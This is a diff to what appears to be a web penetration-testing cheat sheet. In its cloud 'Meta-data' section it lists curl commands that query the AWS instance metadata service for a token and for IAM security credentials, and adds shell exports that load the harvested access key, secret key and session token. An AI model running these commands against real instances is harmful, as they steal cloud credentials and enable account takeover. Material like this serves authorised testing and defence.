@@ -416,9 +416,16 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### Meta-data
 
-`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
 `curl http://169.254.169.254/latest/api/token`
-  
+
+`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
+
+```
+export aws_access_key_id=<access_key_id>  
+export aws_secret_access_key=<secret_access_key>  
+export aws_session_token=<session_token>  
+```
+
 ### Tools
 
 https://github.com/clarketm/s3recon  
